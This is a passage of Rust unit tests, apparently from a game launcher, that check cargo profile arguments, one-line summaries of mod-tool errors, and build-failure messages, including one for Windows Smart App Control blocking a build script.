            .map(|rust| {
                let cmd = compile(
                    rust,
                    &d,
                    Target::Client,
                    Path::new("/native/target"),
                    profile,
                    "horizon-client",
                );
                args_after_host(rust, &cmd)
            })
            .collect();
        assert!(each.windows(2).all(|w| w[0] == w[1]), "{each:?}");
        each[0].clone()
    };
    let performance = args(Profile::Performance);
    assert!(performance.windows(2).any(|w| w == ["--profile", "fast"]));
    assert!(!performance.contains(&"--config".to_string()));
    let dev = args(Profile::Dev);
    assert!(dev.windows(2).any(|w| w == ["--profile", "fast"]));
    assert!(dev.windows(2).any(|w| w
        == [
            "--config",
            "profile.fast.package.horizon-client.opt-level=0"
        ]));
    let release = args(Profile::Release);
    assert!(release.windows(2).any(|w| w == ["--profile", "release"]));
    assert!(
        !release.contains(&"--config".to_string()),
        "the release's own stays"
    );
}

#[test]
fn tool_errors_read_in_one_line() {
    let err = "{\n  \"code\": \"E_REVISION\",\n  \"message\": \"requires exact Horizon revision a\",\n  \"file\": \"m.toml\"\n}";
    assert_eq!(
        diagnostic(err).as_deref(),
        Some("E_REVISION: requires exact Horizon revision a (m.toml)")
    );
}

#[test]
fn a_tool_error_starts_with_the_mod_that_does_not_apply() {
    // horizon-mixins e8cd0aa on Horizon 998b1d8 with fast_items 0.1.0 and appleskin 1.0.0
    // (made for ba6344a), as a player's build was on 2026-11-04.
    let err = r#"{
  "code": "E_TARGET_NOT_FOUND",
  "message": "no source function 'horizon_client::game::titles::Game<'_>::draw_titles'",
  "file": "/home/p/.local/share/horizon-launcher/native/mixins.incoming/appleskin/horizon-mixin.toml",
  "mod_id": "appleskin",
  "injection_id": "hud",
  "target": "horizon_client::game::titles::Game<'_>::draw_titles"
}"#;
    let line = diagnostic(err).unwrap();
    assert!(
        line.starts_with("appleskin (hud): E_TARGET_NOT_FOUND: no source function"),
        "{line}"
    );
    // About a whole mod, no injection in it.
    let err = r#"{"code": "E_REVISION", "message": "pinned to a", "mod_id": "chop"}"#;
    assert_eq!(
        diagnostic(err).as_deref(),
        Some("chop: E_REVISION: pinned to a")
    );
}

#[test]
fn a_tool_error_without_mod_id_extracts_culprit_from_file_path() {
    // horizon-mixins e8cd0aa emits E_MODULE_CONFLICT without mod_id (issue #9391).
    let err = r#"{
  "code": "E_MODULE_CONFLICT",
  "message": "conflict in module horizon_physics",
  "file": "/home/p/.local/share/horizon-launcher/native/mixins.incoming/horizon_physics/horizon-mixin.toml"
}"#;
    let line = diagnostic(err).unwrap();
    assert!(
        line.starts_with("horizon_physics: E_MODULE_CONFLICT: conflict in module horizon_physics"),
        "{line}"
    );

    // Windows path with backslashes
    let err_win = r#"{
  "code": "E_MODULE_CONFLICT",
  "message": "conflict in module biomecompass",
  "file": "C:\\Users\\p\\AppData\\Local\\horizon-launcher\\native\\mixins.incoming\\biomecompass\\horizon-mixin.toml"
}"#;
    let line_win = diagnostic(err_win).unwrap();
    assert!(
        line_win.starts_with("biomecompass: E_MODULE_CONFLICT: conflict in module biomecompass"),
        "{line_win}"
    );

    // mods.incoming path
    let err_mods = r#"{
  "code": "E_MODULE_CONFLICT",
  "message": "conflict in module worldedit",
  "file": "/home/p/.local/share/horizon-launcher/native/mods.incoming/worldedit/horizon-mod.toml"
}"#;
    let line_mods = diagnostic(err_mods).unwrap();
    assert!(
        line_mods.starts_with("worldedit: E_MODULE_CONFLICT: conflict in module worldedit"),
        "{line_mods}"
    );
}

#[test]
fn a_failed_build_names_the_crate_its_output_pushed_out() {
    // cargo's output on Linux without ALSA's development files (Rust 1.99.1, 2026-10-31):
    // the build script's report fills the last lines.
    let errors = ["error: failed to run custom build command for `alsa-sys v0.3.1`".to_owned()];
    let tail: Vec<String> = [
        "  The system library `alsa` required by crate `alsa-sys` was not found.",
        "  HINT: you may need to install a package such as alsa, alsa-dev or alsa-devel.",
        "warning: build failed, waiting for other jobs to finish...",
    ]
    .map(str::to_owned)
    .into();
    let e = failure("Compiling the game", "exit status: 101", &errors, &tail);
    assert!(e.starts_with("Compiling the game failed (exit status: 101). Its first errors"));
    assert!(
        e.ends_with(&format!("{}\n…\n{}", errors[0], tail.join("\n"))),
        "{e}"
    );
    // An error still among the last lines isn't said twice.
    let e = failure("horizon-mixins", "exit status: 1", &errors, &errors);
    assert!(e.contains("The end of its output") && e.matches("alsa-sys").count() == 1);
}

/// Smart App Control refusing a build script (#5911): cargo names the crate, Windows' reason
/// is only in a `Caused by` line in the middle of its output, so the error leads with what to do.
#[cfg(unix)]
#[test]
fn a_build_smart_app_control_blocked_says_how_to_build() {
    let _guard = LOG_TEST.lock().unwrap();
    clear_log().unwrap();
    // cargo's output on Windows 11 25H2 with Smart App Control on (the report in #5911).
    let mut cmd = Command::new("sh");
    cmd.args(["-c", r#"
            echo 'error: failed to run custom build command for `quote v1.0.47`' >&2
            echo 'Caused by:' >&2
            echo '  could not execute process `C:\target\build-script-build` (never executed)' >&2
            echo 'Caused by:' >&2
            echo '  An Application Control policy has blocked this file. (os error 4551)' >&2
            for i in 1 2 3 4 5 6 7 8 9 10 11 12 13; do echo "warning: build failed, waiting ($i)" >&2; done
            exit 101
        "#]);
    let e = run(cmd, "Building horizon-mixins", |_| {}).unwrap_err();
    assert!(e.starts_with(&rust_toolchain::smart_app_control()), "{e}");
    assert!(e.contains("quote v1.0.47"), "{e}");
    // Another failure says nothing about it.
    let mut cmd = Command::new("sh");
    cmd.args([
        "-c",
        "echo 'error: could not compile `horizon-client`' >&2; exit 101",
    ]);
    let e = run(cmd, "Compiling the game", |_| {}).unwrap_err();
    assert!(!e.contains("Smart App Control"), "{e}");
}
